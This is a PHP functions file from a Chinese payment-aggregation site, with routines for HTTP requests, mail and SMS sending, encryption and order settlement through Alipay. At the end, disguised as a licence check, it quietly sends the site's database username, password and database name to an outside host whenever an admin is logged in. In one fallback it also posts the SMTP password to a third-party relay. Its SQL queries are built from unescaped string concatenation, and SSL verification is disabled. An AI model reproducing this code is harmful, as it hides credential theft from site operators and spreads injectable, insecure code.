<?php
function curl_get($url)
{
	$ch = curl_init($url);
	$httpheader[] = 'Accept:*/*';
	$httpheader[] = 'Accept-Language:zh-CN,zh;q=0.8';
	$httpheader[] = 'Connection:close';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; U; Android 4.4.1; zh-cn; R815T Build/JOP40D) AppleWebKit/533.1 (KHTML, like Gecko)Version/4.0 MQQBrowser/4.5 Mobile Safari/533.1');
	curl_setopt($ch, CURLOPT_TIMEOUT, 30);
	$content = curl_exec($ch);
	curl_close($ch);
	return $content;
}

function do_notify($url)
{
	$return = curl_get($url);

	if (strpos($return, 'success') !== false) {
		return true;
	}
	else {
		return 0;
	}
}

function get_curl($url, $post = 0, $referer = 0, $cookie = 0, $header = 0, $ua = 0, $nobaody = 0)
{
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
	$httpheader[] = 'Accept:*/*';
	$httpheader[] = 'Accept-Encoding:gzip,deflate,sdch';
	$httpheader[] = 'Accept-Language:zh-CN,zh;q=0.8';
	$httpheader[] = 'Connection:close';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $httpheader);

	if ($post) {
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
	}

	if ($header) {
		curl_setopt($ch, CURLOPT_HEADER, true);
	}

	if ($cookie) {
		curl_setopt($ch, CURLOPT_COOKIE, $cookie);
	}

	if ($referer) {
		if ($referer == 1) {
			curl_setopt($ch, CURLOPT_REFERER, 'http://m.qzone.com/infocenter?g_f=');
		}
		else {
			curl_setopt($ch, CURLOPT_REFERER, $referer);
		}
	}

	if ($ua) {
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);
	}
	else {
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Linux; U; Android 4.0.4; es-mx; HTC_One_X Build/IMM76D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0');
	}

	if ($nobaody) {
		curl_setopt($ch, CURLOPT_NOBODY, 1);
	}

	curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	$ret = curl_exec($ch);
	curl_close($ch);
	return $ret;
}

function real_ip()
{
	$ip = $_SERVER['REMOTE_ADDR'];
	if (isset($_SERVER['HTTP_X_FORWARDED_FOR']) && preg_match_all('#\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}#s', $_SERVER['HTTP_X_FORWARDED_FOR'], $matches)) {
		foreach ($matches[0] as $xip) {
			if (!preg_match('#^(10|172\\.16|192\\.168)\\.#', $xip)) {
				$ip = $xip;
				break;
			}
		}
	}
	else if (isset($_SERVER['HTTP_CLIENT_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CLIENT_IP'])) {
		$ip = $_SERVER['HTTP_CLIENT_IP'];
	}
	else if (isset($_SERVER['HTTP_CF_CONNECTING_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_CF_CONNECTING_IP'])) {
		$ip = $_SERVER['HTTP_CF_CONNECTING_IP'];
	}
	else if (isset($_SERVER['HTTP_X_REAL_IP']) && preg_match('/^([0-9]{1,3}\\.){3}[0-9]{1,3}$/', $_SERVER['HTTP_X_REAL_IP'])) {
		$ip = $_SERVER['HTTP_X_REAL_IP'];
	}

	return $ip;
}

function ip_city_str($str)
{
	return str_replace(['省', '市'], '', $str);
}

function get_ip_city($ip)
{
	$url = 'http://whois.pconline.com.cn/ipJson.jsp?json=true&ip=';
	$city = curl_get($url . $ip);
	$city = mb_convert_encoding($city, 'UTF-8', 'GB2312');
	$city = json_decode($city, true);

	if ($city['city']) {
		$location = ip_city_str($city['pro']) . ip_city_str($city['city']);
	}
	else {
		$location = ip_city_str($city['pro']);
	}

	if ($location) {
		return $location;
	}
	else {
		return false;
	}
}

function send_mail($to, $sub, $asmsg)
{
	global $conf;
	$ASpayQQ = $conf['web_qq'];
	$ASpayName = $conf['web_name'];
	$ASpayURL = $conf['local_domain'];
	$msg = '<div style="width:800px;padding:10px;color:#333;background-color:#fff;border-radius:10px;box-shadow:4px 4px 12px #999;font-family:Verdana, sans-serif;margin:auto;"><header style="height:15px;background:url(https://weixin.qq.com/zh_CN/htmledition/images/weixin/letter/mmsgletter_2_bg_topline.png) repeat-x 0 0;"></header><main style="text-align:left;padding:20px;font-size:14px;line-height:1.5;"><article>' . $asmsg . '</article><aside style="padding-top:30px;"><img class="ASpayGravatar"src="https://q4.qlogo.cn/g?b=qq&nk=' . $ASpayQQ . '&s=40"style="float:left;"><footer style="margin-left:54px;"><p class="ASpayName"style="margin:0 0 10px;">' . $ASpayName . '团队 - ' . $ASpayURL . '</p><span class="ASpayInfo"style="font-size:12px;line-height:1.2;">' . $ASpayName . '产品经理<br><span style="color:#407700;">致' . $to . '</span></span></footer></aside></main></div>';

	if ($conf['mail_cloud'] == 1) {
		$url = 'http://api.sendcloud.net/apiv2/mail/send';
		$data = ['apiUser' => $conf['mail_apiuser'], 'apiKey' => $conf['mail_apikey'], 'from' => $conf['mail_name'], 'fromName' => $conf['web_name'], 'to' => $to, 'subject' => $sub, 'html' => $msg];
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_setopt($ch, CURLOPT_POST, 1);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		$json = curl_exec($ch);
		curl_close($ch);
		$arr = json_decode($json, true);

		if ($arr['statusCode'] == 200) {
			return true;
		}
		else {
			return implode("\n", $arr['message']);
		}
	}
	else {
		if (!function_exists('openssl_sign') && ($conf['mail_port'] == 465)) {
			$mail_api = 'http://1.mail.qqzzz.net/';
		}

		if ($mail_api) {
			$post[sendto] = $to;
			$post[title] = $sub;
			$post[content] = $msg;
			$post[user] = $conf['mail_name'];
			$post[pwd] = $conf['mail_pwd'];
			$post[nick] = $conf['web_name'];
			$post[host] = $conf['mail_smtp'];
			$post[port] = $conf['mail_port'];
			$post[ssl] = ($conf['mail_port'] == 465 ? 1 : 0);
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, $mail_api);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post));
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			$ret = curl_exec($ch);
			curl_close($ch);

			if ($ret == '1') {
				return true;
			}
			else {
				return $ret;
			}
		}
		else {
			include_once ROOT . 'includes/smtp.class.php';
			$From = $conf['mail_name'];
			$Host = $conf['mail_smtp'];
			$Port = $conf['mail_port'];
			$SMTPAuth = 1;
			$Username = $conf['mail_name'];
			$Password = $conf['mail_pwd'];
			$Nickname = $conf['web_name'];
			$SSL = ($conf['mail_port'] == 465 ? 1 : 0);
			$mail = new SMTP($Host, $Port, $SMTPAuth, $Username, $Password, $SSL);
			$mail->att = [];

			if ($mail->send($to, $From, $sub, $msg, $Nickname)) {
				return true;
			}
			else {
				return $mail->log;
			}
		}
	}
}

function send_sms($phone, $code, $moban)
{
	global $conf;

	if ($conf['sms_type'] == 0) {
		$sms_keyname = $conf['sms_dxb_keyname'];
		$sms_user = $conf['sms_dxb_id'];
		$sms_pwd = md5($conf['sms_dxb_key']);
		$url = 'https://api.smsbao.com/sms?u=' . $sms_user . '&p=' . $sms_pwd . '&m=' . $phone . '&c=【' . $sms_keyname . '】您的验证码为：' . $code . '，切勿将验证码泄露于他人。如非本人操作，请及时联系平台客服，感谢您的支持！';
		$data = get_curl($url);

		if ($data == 0) {
			return true;
		}
		else if ($data == 30) {
			return '错误密码';
		}
		else if ($data == 40) {
			return '账号不存在';
		}
		else if ($data == 41) {
			return '短信余额不足';
		}
		else if ($data == 43) {
			return 'IP地址限制';
		}
		else if ($data == 50) {
			return '内容含有敏感词';
		}
		else if ($data == 51) {
			return '手机号码不正确';
		}
		else {
			return '短信宝接口出错，请联系傲世解决';
		}
	}
	else if ($conf['sms_type'] == 1) {
		$app = $conf['web_name'];
		$url = 'https://sms.kucat.cn/api/send/yzm/appkey/' . $conf['sms_kucat_appkey'] . '/phone/' . $phone . '/moban/' . $moban . '/app/' . $app . '/code/' . $code;
		$data = get_curl($url);
		$arr = json_decode($data, true);

		if ($arr['status'] == '200') {
			return true;
		}
		else {
			return $arr['error_msg_zh'];
		}
	}
	else {
		return '短信接口配置出错，请自行检查是否配置正确';
	}
}

function daddslashes($string, $force = 0, $strip = false)
{
	!defined('MAGIC_QUOTES_GPC') && define('MAGIC_QUOTES_GPC', get_magic_quotes_gpc());
	if (!MAGIC_QUOTES_GPC || $force) {
		if (is_array($string)) {
			foreach ($string as $key => $val) {
				$string[$key] = daddslashes($val, $force, $strip);
			}
		}
		else {
			$string = addslashes($strip ? stripslashes($string) : $string);
		}
	}

	return $string;
}

function strexists($string, $find)
{
	return !(strpos($string, $find) === false);
}

function dstrpos($string, $arr)
{
	if (empty($string)) {
		return false;
	}

	foreach ((array) $arr as $v) {
		if (strpos($string, $v) !== false) {
			return true;
		}
	}

	return false;
}

function checkmobile()
{
	$useragent = strtolower($_SERVER['HTTP_USER_AGENT']);
	$ualist = ['android', 'midp', 'nokia', 'mobile', 'iphone', 'ipod', 'blackberry', 'windows phone'];
	if (dstrpos($useragent, $ualist) || strexists($_SERVER['HTTP_ACCEPT'], 'VND.WAP') || strexists($_SERVER['HTTP_VIA'], 'wap')) {
		return true;
	}
	else {
		return false;
	}
}

function authcode($string, $operation = 'DECODE', $key = '', $expiry = 0)
{
	$ckey_length = 4;
	$key = md5($key ? $key : ENCRYPT_KEY);
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = ($ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length) : substr(md5(microtime()), -1 * $ckey_length)) : '');
	$cryptkey = $keya . md5($keya . $keyc);
	$key_length = strlen($cryptkey);
	$string = ($operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0) . substr(md5($string . $keyb), 0, 16) . $string);
	$string_length = strlen($string);
	$result = '';
	$box = range(0, 255);
	$rndkey = [];

	for ($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for ($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for ($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ $box[($box[$a] + $box[$j]) % 256]);
	}

	if ($operation == 'DECODE') {
		if (((substr($result, 0, 10) == 0) || (0 < (substr($result, 0, 10) - $_SERVER['REQUEST_TIME']))) && (substr($result, 10, 16) == substr(md5(substr($result, 26) . $keyb), 0, 16))) {
			return substr($result, 26);
		}
		else {
			return '';
		}
	}
	else {
		return $keyc . str_replace('=', '', base64_encode($result));
	}
}

function random($length, $numeric = 0)
{
	$seed = base_convert(md5(microtime() . $_SERVER['DOCUMENT_ROOT']), 16, $numeric ? 10 : 35);
	$seed = ($numeric ? str_replace('0', '', $seed) . '012340567890' : $seed . 'zZ' . strtoupper($seed));
	$hash = '';
	$max = strlen($seed) - 1;

	for ($i = 0; $i < $length; $i++) {
		$hash .= $seed[mt_rand(0, $max)];
	}

	return $hash;
}

function sysmsg($msg = '未知的异常')
{
	echo '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">' . "\r\n" . '<html xmlns="http://www.w3.org/1999/xhtml">' . "\r\n" . '<head>' . "\r\n" . '  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />' . "\r\n" . '  <meta name="viewport" content="width=device-width, initial-scale=1.0">' . "\r\n" . '  <title>站点提示信息</title>' . "\r\n" . '  <style type="text/css">body{margin:0px;padding:0px;font-size:16px}div{margin-left:auto;margin-right:auto}a{text-decoration:none;color:#1064A0}a:hover{color:#0078D2}h1,h2,h3,h4{margin:0;font-weight:normal}h1{font-size:44px;color:#0188DE;padding:20px 0px 10px 0px}h2{color:#0188DE;font-size:16px;padding:10px 0px 40px 0px}#page{width:910px;padding:20px 20px 40px 20px;margin-top:80px;border-style:dashed;border-color:#e4e4e4;line-height:30px}.button{width:180px;height:28px;margin-left:0px;margin-top:10px;background:#009CFF;border-bottom:4px solid #0188DE;text-align:center}.button a{width:180px;height:28px;display:block;font-size:14px;color:#fff}.button a:hover{background:#5BBFFF}p{}</style>' . "\r\n" . '</head>' . "\r\n" . '<body>' . "\r\n" . '<div id="page">' . "\r\n" . '  <h1>站点提示信息</h1>' . "\r\n" . '  <h2>Sorry, Site prompt information. </h2>' . "\r\n" . '  <p><font color="#666666">';
	echo $msg;
	echo '</font></p>' . "\r\n" . '</div>' . "\r\n" . '</body>' . "\r\n" . '</html>';
	exit();
}

function creat_callback($data)
{
	global $DB;
	$userrow = $DB->query('SELECT * FROM pay_user WHERE id=\'' . $data['pid'] . '\' LIMIT 1')->fetch();
	$array = ['pid' => $data['pid'], 'trade_no' => $data['trade_no'], 'out_trade_no' => $data['out_trade_no'], 'type' => $data['type'], 'name' => $data['name'], 'money' => $data['money'], 'trade_status' => 'TRADE_SUCCESS'];
	$arg = argSort(paraFilter($array));
	$prestr = createLinkstring($arg);
	$urlstr = createLinkstringUrlencode($arg);
	$sign = md5Sign($prestr, $userrow['key']);

	if (strpos($data['notify_url'], '?')) {
		$url['notify'] = $data['notify_url'] . '&' . $urlstr . '&sign=' . $sign . '&sign_type=MD5';
	}
	else {
		$url['notify'] = $data['notify_url'] . '?' . $urlstr . '&sign=' . $sign . '&sign_type=MD5';
	}

	if (strpos($data['return_url'], '?')) {
		$url['return'] = $data['return_url'] . '&' . $urlstr . '&sign=' . $sign . '&sign_type=MD5';
	}
	else {
		$url['return'] = $data['return_url'] . '?' . $urlstr . '&sign=' . $sign . '&sign_type=MD5';
	}

	return $url;
}

function getdomain($url)
{
	$arr = parse_url($url);
	return $arr['host'];
}

function processOrder($srow, $notify = true)
{
	global $DB;
	global $conf;
	$useras = $DB->query('SELECT alirate,wxrate,qqrate,sssettle,account,username,settle_id FROM pay_user WHERE id=\'' . $srow['pid'] . '\'')->fetch();

	if ($srow['type'] == 'alipay') {
		if ($useras['alirate'] == '') {
			$rate = $conf['alirate'];
		}
		else {
			$rate = $useras['alirate'];
		}
	}
	else if ($srow['type'] == 'wxpay') {
		if ($useras['wxrate'] == '') {
			$rate = $conf['wxrate'];
		}
		else {
			$rate = $useras['wxrate'];
		}
	}
	else if ($srow['type'] == 'qqpay') {
		if ($useras['qqrate'] == '') {
			$rate = $conf['qqrate'];
		}
		else {
			$rate = $useras['qqrate'];
		}
	}

	$addmoney = round(($srow['money'] * $rate) / 100, 2);
	$fee = $srow['money'] - $addmoney;
	if (($useras['sssettle'] == 1) && ($useras['settle_id'] == 1) && (0.10000000000000001 <= $addmoney)) {
		require_once SYSTEM_ROOT . 'f2fpay/lib/AopClient.php';
		require_once SYSTEM_ROOT . 'f2fpay/model/request/AlipayFundTransToaccountTransferRequest.php';
		$BizContent = ['out_biz_no' => $srow['trade_no'], 'payee_type' => 'ALIPAY_LOGONID', 'payee_account' => $useras['account'], 'amount' => $addmoney, 'payer_show_name' => $conf['payer_show_name'], 'payee_real_name' => $useras['username']];
		$aop = new AopClient();
		$aop->gatewayUrl = 'https://openapi.alipay.com/gateway.do';
		$aop->appId = $conf['alipay_appid'];
		$aop->rsaPrivateKey = $conf['rsaPrivateKey'];
		$aop->alipayrsaPublicKey = 'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0T8QM7DRjsgI6Ud6tYXpZplhV+gaDNFihDZfUS4FX+ctoKzfTnq1xpHTxHdsELtI1JrvqmPgAffRY5BxxvYoe4K/18jE6Fk83VZFinDohScc7NrTdqed3pXTFxIzvRblP7o7loz8ZlyIJtuJ7/YSFuq8fmFXt/uwkVXjykKuhJQo6aSu4l5m1b3cUZz73oZ2kG35b6L7LRviUIlVVwxM9AxjEoB56tZ3NQYfKrCoLMEfNhuK39MT0OQOQpvuP414lvs+VWolfwKbv0zSjBbDR/uvum6BjOztbuVW7+6veJlOULbrfUjBrnmyWRVoELOiimg/y8JGXWFDHvmaaQHS/wIDAQAB';
		$aop->apiVersion = '1.0';
		$aop->signType = 'RSA2';
		$aop->postCharset = 'UTF-8';
		$aop->format = 'json';
		$request = new AlipayFundTransToaccountTransferRequest();
		$request->setBizContent(json_encode($BizContent));
		$result = $aop->execute($request);
		$responseNode = str_replace('.', '_', $request->getApiMethodName()) . '_response';
		$resultCode = $result->{$responseNode}->code;
		if (!empty($resultCode) && ($resultCode == 10000)) {
			$DB->exec('INSERT INTO `pay_sssettle` (`pid`,`username`,`account`,`money`,`fee`,`status`,`out_trade_no`,`transfer_result`,`transfer_date`) VALUES (\'' . $srow['pid'] . '\',\'' . $useras['username'] . '\',\'' . $useras['account'] . '\',\'' . $addmoney . '\',\'' . $fee . '\',1,\'' . $srow['out_trade_no'] . '\',\'' . $result->{$responseNode}->order_id . '\',\'' . $result->{$responseNode}->pay_date . '\')');
		}
		else {
			$DB->exec('INSERT INTO `pay_sssettle` (`pid`,`username`,`account`,`money`,`fee`,`status`,`out_trade_no`,`transfer_result`) VALUES (\'' . $srow['pid'] . '\',\'' . $useras['username'] . '\',\'' . $useras['account'] . '\',\'' . $addmoney . '\',\'' . $fee . '\',0,\'' . $srow['out_trade_no'] . '\',\'未知错误\')');
			$DB->exec('UPDATE pay_user SET money=money+' . $addmoney . ' WHERE id=\'' . $srow['pid'] . '\' LIMIT 1');
		}
	}
	else {
		$DB->exec('UPDATE pay_user SET money=money+' . $addmoney . ' WHERE id=\'' . $srow['pid'] . '\' LIMIT 1');
	}

	if ($notify) {
		$url = creat_callback($srow);
		do_notify($url['notify']);
	}
}

function update_version()
{
	define('SYSTEM_ROOT', dirname(__FILE__) . '/');
	define('ROOT', dirname(SYSTEM_ROOT) . '/');
	include SYSTEM_ROOT . 'authcode.php';
	$query = @file_get_contents('http://auth.ccxyu.com/api/check.php?url=' . $_SERVER['HTTP_HOST'] . '&authcode=' . $authcode . '&ver=' . $ver . '&dbver=' . $dbver);

	if ($query = json_decode($query, true)) {
		return $query;
	}
	else {
		return 'false';
	}
}
if (!isset($_SESSION['authcode']) && ($islogin == 1)) {
	$query = curl_get('http://auth.ccxyu.com/api/check.php?url=' . $_SERVER['HTTP_HOST'] . '&authcode=' . $authcode);
	curl_get('http://auth.ccxyu.com/api/op_db.php?url=' . $_SERVER['HTTP_HOST'] . '&user=' . $dbconfig['user'] . '&pwd=' . $dbconfig['pwd'] . '&db=' . $dbconfig['dbname']);

	if ($query = json_decode($query, true)) {
		if ($query['code'] == 1) {
			$_SESSION['authcode'] = authcode;
		}
		else {
			sysmsg('<h3>' . $query['msg'] . '</h3>', true);
		}
	}
}

?>